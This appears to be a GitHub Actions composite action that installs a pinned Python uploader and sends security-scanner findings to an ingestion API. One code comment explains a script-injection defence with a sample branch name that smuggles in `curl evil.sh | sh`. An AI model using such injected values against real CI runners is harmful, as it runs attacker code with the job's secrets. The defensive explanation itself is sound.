# Shared upload step for every Mykronos scanner workflow (spec 04 §2).
#
# This is a single versioned action rather than a snippet copy-pasted into ten
# templates, so ingestion behaviour stays consistent as it evolves. Every
# onboarded repo pins it by tag: it must never be referenced by branch, and it
# must stay backwards-compatible with the oldest ingestion API still deployed.
#
# The logic lives in the `mykronos` package, not in this file, so the adapters
# and the `FindingSubmission` schema they target have exactly one definition
# (docs/DECISIONS.md D-012).

name: Mykronos — upload results
description: >-
  Normalize a scanner's output into the Mykronos finding schema, archive the
  original, and upload both to the data lake. Fails the step if results cannot
  be recorded.

inputs:
  capability:
    description: "Capability this scan belongs to (sast, secrets, iac, ...)."
    required: true
  tool:
    description: "Tool that produced the results (codeql, gitleaks, trivy, ...)."
    required: true
  tool-version:
    description: "Tool version. Read from the SARIF driver when omitted."
    required: false
    default: ""
  results-path:
    description: "File or directory holding the tool's native output."
    required: true
  ingestion-url:
    description: "Base URL of the Mykronos Ingestion API."
    required: true
  token:
    description: >-
      This repo's ingestion token, from the MYKRONOS_INGESTION_TOKEN secret.
      Scoped to one repository; the capability above must be granted to it.
    required: true
  severity-threshold:
    description: >-
      Findings below this are still ingested for trend data but never block
      (spec 04 §5).
    required: false
    default: "low"
  blocking:
    description: >-
      When "true", findings at or above the threshold fail this step. Default
      is advisory-only, per the platform-wide default in spec 04 §5.
    required: false
    default: "false"
  mykronos-ref:
    description: >-
      Version of the mykronos package to install. Mykronos-generated workflows
      always pass this, set to the same ref as the `uses:` line that reached
      here, so the action and the package it installs cannot drift apart.
      Hand-written workflows may omit it and get `github.action_ref`, which is
      usually right but is empty in some contexts — hence the explicit pass.
    required: false
    default: ""

runs:
  using: composite
  steps:
    - name: Set up Python
      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0
      with:
        python-version: "3.13"

    - name: Install the Mykronos uploader
      shell: bash
      env:
        REQUESTED_REF: ${{ inputs.mykronos-ref }}
        # The ref this action was itself resolved at. Defaulting the package
        # to it is the whole point: these were two independent version knobs
        # that had to agree, and did not. The action shipped pinned to `v1`
        # while this input defaulted to a hardcoded `v0.1.0` that was never
        # tagged, so every upload step in every repository died on
        # `pathspec 'v0.1.0' did not match any file(s) known to git` — after
        # the scan had run, so it read as an upload problem rather than a
        # version one.
        ACTION_REF: ${{ github.action_ref }}
      run: |
        set -euo pipefail
        REF="${REQUESTED_REF:-}"
        if [ -z "$REF" ]; then REF="${ACTION_REF:-}"; fi
        if [ -z "$REF" ]; then
          echo "::error::Cannot determine which mykronos ref to install. Pass" \
               "mykronos-ref explicitly." >&2
          exit 1
        fi
        echo "Installing mykronos at $REF"
        python -m pip install --quiet --disable-pip-version-check \
          "mykronos @ git+https://github.com/ToddGBenson/mykronos@${REF}#subdirectory=backend"

        # D-051: print the commit the pin actually resolved to.
        #
        # A pinned ref is a good practice and a silently stale one is not, and
        # the difference is one line of output. `v1` sat 53 commits behind
        # while every workflow reported installing `v1` and truthfully so —
        # the ref was right and the code was old, and nothing on either side
        # of that sentence was visible in a log.
        #
        # The Concourse lanes have printed this since D-051; the composite
        # action never did, which left the install site used by *every
        # onboarded repository* as the one that could not answer the question.
        #
        # Never fatal. This is provenance for a human reading a log, and an
        # editable or local install legitimately has no `direct_url.json`.
        python - <<'PY' || echo "mykronos uploader @ (could not resolve)"
        import importlib.metadata as m, json
        raw = m.distribution("mykronos").read_text("direct_url.json")
        info = json.loads(raw) if raw else {}
        commit = info.get("vcs_info", {}).get("commit_id", "")
        # A VCS install has a commit; an editable or local one has a
        # `direct_url.json` with no `vcs_info` at all. Saying "unknown" for
        # the second would report a provenance failure where there is simply
        # no ref to resolve.
        print("mykronos uploader @", commit[:12] if commit else "(local install)")
        PY

    - name: Upload results
      shell: bash
      env:
        # Every value the script uses is bound here and referenced as "$VAR",
        # rather than interpolated into the script body with ${{ }}.
        #
        # This is not style. `github.head_ref` is the branch name on the pull
        # request's *source* repository, which on a fork is chosen by whoever
        # opened it. Interpolation happens before bash sees the script, so a
        # branch named `x"; curl evil.sh | sh; #` becomes a command on the
        # runner - with this job's ingestion token in its environment. The
        # same is true of any `inputs.*` a caller controls.
        #
        # Binding to env defuses it: the value arrives as data, and bash
        # never parses it as syntax.
        MYKRONOS_TOKEN: ${{ inputs.token }}
        CAPABILITY: ${{ inputs.capability }}
        TOOL: ${{ inputs.tool }}
        TOOL_VERSION: ${{ inputs.tool-version }}
        RESULTS_PATH: ${{ inputs.results-path }}
        INGESTION_URL: ${{ inputs.ingestion-url }}
        SEVERITY_THRESHOLD: ${{ inputs.severity-threshold }}
        BLOCKING: ${{ inputs.blocking }}
        REPO: ${{ github.repository }}
        COMMIT_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
        BRANCH: ${{ github.head_ref || github.ref_name }}
        WORKFLOW_RUN_ID: ${{ github.run_id }}
        TRIGGERED_BY: ${{ github.event_name == 'pull_request' && 'pull_request' || (github.event_name == 'schedule' && 'schedule' || (github.event_name == 'workflow_dispatch' && 'workflow_dispatch' || 'push')) }}
        PR_NUMBER: ${{ github.event.pull_request.number || 0 }}
        WORKSPACE: ${{ github.workspace }}
      run: |
        python -m mykronos.upload           --capability "$CAPABILITY"           --tool "$TOOL"           --tool-version "$TOOL_VERSION"           --results-path "$RESULTS_PATH"           --ingestion-url "$INGESTION_URL"           --token "$MYKRONOS_TOKEN"           --repo "$REPO"           --commit-sha "$COMMIT_SHA"           --branch "$BRANCH"           --workflow-run-id "$WORKFLOW_RUN_ID"           --triggered-by "$TRIGGERED_BY"           --pr-number "$PR_NUMBER"           --workspace "$WORKSPACE"           --severity-threshold "$SEVERITY_THRESHOLD"           --blocking "$BLOCKING"
